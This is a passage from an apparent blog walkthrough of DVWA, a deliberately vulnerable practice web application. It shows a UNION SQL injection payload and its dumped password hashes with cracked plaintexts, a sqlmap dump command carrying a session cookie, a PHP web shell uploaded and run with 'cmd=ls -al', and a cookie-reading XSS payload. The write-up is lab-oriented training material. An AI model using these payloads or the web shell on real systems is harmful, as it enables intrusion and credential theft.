</span><span class='line'>Surname:</span></code></pre></td></tr></table></div></figure></p>

<blockquote><p>&lsquo; union select user, password from users&ndash; -
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: &rsquo; union select user, password from users&ndash; -
</span><span class='line'>First name: admin
</span><span class='line'>Surname: 098f6bcd4621d373cade4e832627b4f6&lt;/p&gt;&lt;/blockquote&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID: &lsquo; union select user, password from users&ndash; -
</span><span class='line'>First name: gordonb
</span><span class='line'>Surname: e99a18c428cb38d5f260853678922e03&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID: &lsquo; union select user, password from users&ndash; -
</span><span class='line'>First name: 1337
</span><span class='line'>Surname: 8d3533d75ae2c3966d7e0d4fcc69216b&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID: &lsquo; union select user, password from users&ndash; -
</span><span class='line'>First name: pablo
</span><span class='line'>Surname: 0d107d09f5bbe40cade3de5c71e9e9b7&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ID: &lsquo; union select user, password from users&ndash; -
</span><span class='line'>First name: smithy
</span><span class='line'>Surname: 5f4dcc3b5aa765d61d8327deb882cf99
</span><span class='line'>&lt;code&gt;``
</span><span class='line'>Looks like passwords are MD5 hashed. However, they are easily found to be&lt;/code&gt;test&lt;code&gt;,&lt;/code&gt;abc123&lt;code&gt;,&lt;/code&gt;charley&lt;code&gt;,&lt;/code&gt;letmein&lt;code&gt;and&lt;/code&gt;password` respectively.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;SQL Injection(Blind)&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
</span><span class='line'>We can use &lt;code&gt;sqlmap&lt;/code&gt; to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)</span></code></pre></td></tr></table></div></figure>
sqlmap -u &ldquo;<a href="http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#">http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#</a>&rdquo; &ndash;cookie=&ldquo;security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&rdquo; &ndash;dump</p>

<pre><code></code></pre>

<p>Database: dvwa
Table: users
[5 entries]
+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
| user_id | user    | avatar                                                | password                         | last_name | first_name |
+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
| 1       | admin   | <a href="http://192.168.52.129/dvwa/hackable/users/admin.jpg">http://192.168.52.129/dvwa/hackable/users/admin.jpg</a>   | 098f6bcd4621d373cade4e832627b4f6 | admin     | admin      |
| 2       | gordonb | <a href="http://192.168.52.129/dvwa/hackable/users/gordonb.jpg">http://192.168.52.129/dvwa/hackable/users/gordonb.jpg</a> | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
| 3       | 1337    | <a href="http://192.168.52.129/dvwa/hackable/users/1337.jpg">http://192.168.52.129/dvwa/hackable/users/1337.jpg</a>    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
| 4       | pablo   | <a href="http://192.168.52.129/dvwa/hackable/users/pablo.jpg">http://192.168.52.129/dvwa/hackable/users/pablo.jpg</a>   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
| 5       | smithy  | <a href="http://192.168.52.129/dvwa/hackable/users/smithy.jpg">http://192.168.52.129/dvwa/hackable/users/smithy.jpg</a>  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;+
&#8220;`</p>

<h2>Upload</h2>

<p><img src="/images/up.png"></p>

<p>On the low security setting there are no restrictions on file upload. We can upload a php file containing simple code:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">REQUEST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">cmd</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])){</span>
</span><span class='line'>    <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">REQUEST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">cmd</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]);</span>
</span><span class='line'>    <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span><span class='line'>    <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span><span class="nv">$cmd</span><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="k">die</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>
<code>
../../hackable/uploads/shell.php succesfully uploaded!
</code>
We can execute commands now via this shell:
<code>
http://192.168.52.129/dvwa/hackable/uploads/shell.php?cmd=ls -al
</code></p>

<h2>XSS reflected</h2>

<p><img src="/images/xss.png"></p>

<p>Here whatever we enter gets included into page source.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span></code></pre></td></tr></table></div></figure>
<img src="/images/cookie.png"></p>

<h2>XSS stored</h2>

<p><img src="/images/xss2.png"></p>

<p>Here the app is vulnerable to XSS again. However, this time the injected code is stored inside the database and is executed every time somebody visits the guestbook page.</p>

<p><img src="/images/stored.png"></p>

<h2>Summary</h2>

<p>DVWA includes most common web server vulnerabilities and provides easy access to the vulnerable pieces of code. It is a great package for a beginner level pentest demo.</p>
]]></content>
  </entry>
  
</feed>
